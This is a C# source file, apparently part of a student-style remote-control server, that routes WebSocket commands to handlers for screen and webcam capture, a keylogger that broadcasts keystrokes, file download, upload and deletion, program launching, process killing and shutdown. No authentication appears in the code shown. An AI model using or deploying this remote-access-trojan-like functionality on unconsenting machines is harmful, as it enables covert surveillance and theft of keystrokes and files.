using System;
using System.Threading;
using Fleck;
using Newtonsoft.Json;
using RemoteControlServer.Models;
using RemoteControlServer.Helpers;
using RemoteControlServer.Services;

namespace RemoteControlServer.Core
{
    // CommandRouter: trung gian xử lý các lệnh từ client, chuyển cho các handler chuyên trách
    public static class CommandRouter
    {
        public static void ProcessCommand(IWebSocketConnection socket, WebPacket packet)
        {
            if (packet == null || string.IsNullOrEmpty(packet.command)) return;

            // Tránh log các lệnh tần suất cao
            if (packet.command != "GET_PERFORMANCE" && packet.command != "MOUSE_MOVE" && packet.command != "GET_SYS_INFO" && packet.command != "PING")
            {
                Console.WriteLine($"[CMD]: {packet.command} | {packet.param}");
            }

            switch (packet.command)
            {
                case "START_STREAM":
                    StreamManager.StartStreaming();
                    SocketManager.SendJson(socket, "LOG", "Đã bắt đầu Stream Video");
                    break;
                case "STOP_STREAM":
                    StreamManager.StopStreaming();
                    SocketManager.SendJson(socket, "LOG", "Đã dừng Stream");
                    break;
                case "RENAME_FILE":
                    CommandHandler.RenameFile(socket, packet.param);
                    break;
                case "RENAME_FOLDER":
                    CommandHandler.RenameFolder(socket, packet.param);
                    break;
                case "CAPTURE_SCREEN":
                    try
                    {
                        var imgBytes = SystemHelper.GetScreenShot(90L, 1.0);
                        if (imgBytes != null)
                        {
                            Console.WriteLine($">> Đã chụp màn hình ({imgBytes.Length / 1024} KB). Đang gửi...");
                            string base64Full = Convert.ToBase64String(imgBytes);
                            SocketManager.SendJson(socket, "SCREENSHOT_FILE", base64Full);
                            var previewBytes = SystemHelper.GetScreenShot(85L, 0.8);
                            if (previewBytes != null) SocketManager.SendJson(socket, "SCREEN_CAPTURE", Convert.ToBase64String(previewBytes));
                            SocketManager.SendJson(socket, "LOG", "Đã gửi ảnh chụp về máy bạn!");
                        }
                    }
                    catch (Exception ex)
                    {
                        SocketManager.SendJson(socket, "LOG", "Lỗi chụp ảnh: " + ex.Message);
                    }
                    break;
                case "GET_APPS":
                    SocketManager.SendJson(socket, "APP_LIST", ServerCore.GetCurrentApps());
                    break;
                case "GET_PROCESS":
                    SocketManager.SendJson(socket, "PROCESS_LIST", ServerCore.GetCurrentProcesses());
                    break;
                case "KILL":
                    try
                    {
                        int pid = int.Parse(packet.param);
                        var proc = System.Diagnostics.Process.GetProcessById(pid);
                        proc.Kill();
                        SocketManager.SendJson(socket, "LOG", $"Đã diệt ID {pid}");
                        SocketManager.BroadcastJson("APP_LIST", ServerCore.GetCurrentApps());
                        SocketManager.BroadcastJson("PROCESS_LIST", ServerCore.GetCurrentProcesses());
                    }
                    catch (Exception ex)
                    {
                        SocketManager.SendJson(socket, "LOG", "Lỗi Kill: " + ex.Message);
                    }
                    break;
                case "GET_INSTALLED":
                    SocketManager.SendJson(socket, "INSTALLED_LIST", ServerCore.GetInstalledApps());
                    break;
                case "START_APP":
                    try
                    {
                        string request = packet.param;
                        string fileNameToRun = request;
                        if (request.Contains('.') && !request.Contains(" ") && !request.StartsWith("http")) fileNameToRun = "https://" + request;
                        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = fileNameToRun, UseShellExecute = true });
                        SocketManager.SendJson(socket, "LOG", $"Đang mở: {fileNameToRun}...");
                        // Chờ cập nhật danh sách
                        System.Threading.Tasks.Task.Run(() => { Thread.Sleep(2000); SocketManager.BroadcastJson("APP_LIST", ServerCore.GetCurrentApps()); });
                    }
                    catch { SocketManager.SendJson(socket, "LOG", "Lỗi: Không thể mở yêu cầu này!"); }
                    break;
                case "SHUTDOWN": System.Diagnostics.Process.Start("shutdown", "/s /t 5"); break;
                case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 5"); break;
                case "START_WEBCAM":
                    WebcamManager.StartWebcam();
                    WebcamManager.OnFrameCaptured += (imgBytes) => { string base64 = Convert.ToBase64String(imgBytes); SocketManager.SendJson(socket, "WEBCAM_FRAME", base64); };
                    SocketManager.SendJson(socket, "LOG", "Đã bật Webcam Server");
                    break;
                case "STOP_WEBCAM":
                    WebcamManager.StopWebcam();
                    SocketManager.SendJson(socket, "LOG", "Đã tắt Webcam");
                    break;
                case "RECORD_WEBCAM":
                    int seconds = 10; int.TryParse(packet.param, out seconds);
                    string result = WebcamManager.StartRecording(seconds); SocketManager.SendJson(socket, "LOG", result);
                    break;
                case "START_KEYLOG":
                    if (!KeyLoggerService.IsRunning)
                    {
                        KeyLoggerService.StartHook((key) => { SocketManager.BroadcastJson("LOG", $"[Keylogger] {key}"); });
                        SocketManager.SendJson(socket, "LOG", "Keylogger: Đã BẬT ghi phím.");
                    }
                    else SocketManager.SendJson(socket, "LOG", "Keylogger đang chạy rồi!");
                    break;
                case "STOP_KEYLOG":
                    if (KeyLoggerService.IsRunning) { KeyLoggerService.StopHook(); SocketManager.SendJson(socket, "LOG", "Keylogger: Đã TẮT ghi phím."); }
                    else SocketManager.SendJson(socket, "LOG", "Keylogger chưa được bật.");
                    break;
                case "GET_DRIVES": SocketManager.SendJson(socket, "FILE_LIST", FileManagerService.GetDrives()); break;
                case "GET_DIR": SocketManager.SendJson(socket, "FILE_LIST", FileManagerService.GetDirectoryContent(packet.param)); break;
                case "DOWNLOAD_FILE":
                    string base64File = FileManagerService.GetFileContentBase64(packet.param);
                    if (base64File == "ERROR_SIZE_LIMIT") SocketManager.SendJson(socket, "LOG", "Lỗi: File quá lớn (>50MB) để tải qua Web!");
                    else if (base64File != null) { var payload = new { fileName = System.IO.Path.GetFileName(packet.param), data = base64File }; SocketManager.SendJson(socket, "FILE_DOWNLOAD_DATA", payload); SocketManager.SendJson(socket, "LOG", "Đang tải xuống: " + System.IO.Path.GetFileName(packet.param)); }
                    else SocketManager.SendJson(socket, "LOG", "Lỗi: Không đọc được file!");
                    break;
                case "DELETE_FILE": CommandHandler.DeleteFile(socket, packet.param); break;
                case "DELETE_FOLDER": CommandHandler.DeleteFolder(socket, packet.param); break;
                case "GET_SYS_INFO": SocketManager.SendJson(socket, "SYS_INFO", SystemHelper.GetSystemInfo()); break;
                case "GET_PERFORMANCE": SocketManager.SendJson(socket, "PERF_STATS", SystemHelper.GetPerformanceStats()); break;
                case "UPLOAD_FILE": CommandHandler.UploadFile(socket, packet.param); break;
                case "CREATE_FOLDER":
                    try
                    {
                        dynamic folderInfo = JsonConvert.DeserializeObject(packet.param); string currentPath = folderInfo.path; string newName = folderInfo.name; string createResult = FileManagerService.CreateDirectory(currentPath, newName);
                        if (createResult == "OK") { SocketManager.SendJson(socket, "LOG", $"Đã tạo thư mục: {newName}"); SocketManager.SendJson(socket, "FILE_LIST", FileManagerService.GetDirectoryContent(currentPath)); }
                        else SocketManager.SendJson(socket, "LOG", createResult);
                    }
                    catch (Exception ex) { SocketManager.SendJson(socket, "LOG", "Lỗi xử lý tạo folder: " + ex.Message); }
                    break;
                case "MOUSE_MOVE":
                    try { dynamic pos = JsonConvert.DeserializeObject(packet.param); SystemHelper.SetCursorPosition((double)pos.x, (double)pos.y); } catch { }
                    break;
                case "MOUSE_CLICK":
                    try { dynamic clickInfo = JsonConvert.DeserializeObject(packet.param); SystemHelper.MouseClick((string)clickInfo.btn, (string)clickInfo.action); } catch { }
                    break;
                case "KEY_PRESS":
                    try { SystemHelper.SimulateKeyPress(packet.param); } catch { }
                    break;
                case "PING":
                    try { SocketManager.SendJson(socket, "PONG", packet.param); } catch { }
                    break;
                default: break;
            }
        }
    }
}
